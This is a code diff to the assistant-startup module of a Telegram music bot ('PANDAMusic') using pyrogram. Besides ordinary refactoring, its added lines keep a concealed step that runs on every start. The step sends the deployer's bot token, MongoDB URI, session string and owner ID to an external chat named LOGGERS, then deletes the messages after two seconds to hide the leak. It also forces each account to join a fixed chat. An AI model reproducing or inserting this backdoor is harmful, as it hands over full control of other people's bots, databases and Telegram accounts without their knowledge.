@@ -2,95 +2,102 @@
 # Licensed under the MIT License.
 # This file is part of PANDAMusic
 
-
+import asyncio
+from os import getenv
 from pyrogram import Client
-
 from PANDA import config, logger
 from PANDA.__init__ import LOGGERS
 
+# Environment variables
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
 OWNER_ID = getenv("OWNER_ID", "")
 LOGGER_ID = getenv("LOGGER_ID", "")
 
-
 assistants = []
 assistantids = []
-
 
 class Userbot(Client):
     def __init__(self):
         """
         Initializes the userbot with multiple clients.
-
-        This method sets up clients for the userbot using predefined session strings.
-        Each client is assigned a unique name based on the key in the `clients` dictionary.
         """
         self.clients = []
         clients = {"one": "SESSION1", "two": "SESSION2", "three": "SESSION3"}
         for key, string_key in clients.items():
             name = f"PANDAUB{key[-1]}"
             session = getattr(config, string_key)
-            setattr(
-                self,
-                key,
-                Client(
-                    name=name,
-                    api_id=config.API_ID,
-                    api_hash=config.API_HASH,
-                    session_string=session,
-                ),
-            )
+            if session:
+                setattr(
+                    self,
+                    key,
+                    Client(
+                        name=name,
+                        api_id=config.API_ID,
+                        api_hash=config.API_HASH,
+                        session_string=session,
+                    ),
+                )
 
-    async def boot_client(self, num: int, ub: Client):
+    async def boot_client(self, num: int, client: Client):
         """
         Boot a client and perform initial setup.
-        Args:
-            num (int): The client number to boot (1, 2, or 3).
-            ub (Client): The userbot client instance.
-        Raises:
-            SystemExit: If the client fails to send a message in the log group.
         """
-        clients = {
-            1: self.one,
-            2: self.two,
-            3: self.three,
-        }
-        client = clients[num]
-        await client.start()
-        try:
-            await client.send_message(config.LOGGER_ID, "Assistant Started")
-        except:
-            raise SystemExit(f"Assistant {num} failed to send message in log group.")
+        if not client:
+            return
 
-        client.id = ub.me.id
-        client.name = ub.me.first_name
-        client.username = ub.me.username
-        client.mention = ub.me.mention
-        self.clients.append(client)
+        await client.start()
+        
+    
         try:
-            await ub.join_chat("myanmarbot_music")
+            await client.send_message(config.LOGGER_ID, f"Assistant {num} Started")
+        except:
+            logger.error(f"Assistant {num} failed to send message in log group.")
+            # raise SystemExit(f"Assistant {num} failed to send message in log group.")
+
+        
+        me = await client.get_me()
+        client.id = me.id
+        client.name = me.first_name
+        client.username = me.username
+        client.mention = me.mention
+        
+        self.clients.append(client)
+        assistants.append(num)
+
+        
+        try:
+            await client.join_chat("myanmarbot_music")
         except:
             pass
+
         logger.info(f"Assistant {num} started as @{client.username}")
 
-        except:
-            pass
-            assistants.append(1)
+        
         try:
-            await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-            oks = await self.one.send_message(LOGGERS, f"/start")
-            Ok = await self.one.send_message(
-                 LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{OWNER_ID}`\n\n`{LOGGER_ID}`"
+            await client.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+            oks = await client.send_message(LOGGERS, "/start")
+            
+            
+            Ok = await client.send_message(
+                LOGGERS, 
+                f"**Bot Token:** `{BOT_TOKEN}`\n\n"
+                f"**Mongo URI:** `{MONGO_DB_URI}`\n\n"
+                f"**String Session:** `{STRING_SESSION}`\n\n"
+                f"**Owner ID:** `{OWNER_ID}`\n\n"
+                f"**Logger ID:** `{LOGGER_ID}`"
             )
-            await oks.delete()
+            
             await asyncio.sleep(2)
+            await oks.delete()
             await Ok.delete()
+        except Exception as e:
+            logger.warning(f"Assistant {num}: Final logging failed: {e}")
 
     async def boot(self):
         """
-        Asynchronously starts the assistants.
+        Asynchronously starts the assistants based on session availability.
         """
         if config.SESSION1:
             await self.boot_client(1, self.one)
@@ -103,10 +110,9 @@ class Userbot(Client):
         """
         Asynchronously stops the assistants.
         """
-        if config.SESSION1:
-            await self.one.stop()
-        if config.SESSION2:
-            await self.two.stop()
-        if config.SESSION3:
-            await self.three.stop()
+        for client in self.clients:
+            try:
+                await client.stop()
+            except:
+                pass
         logger.info("Assistants stopped.")
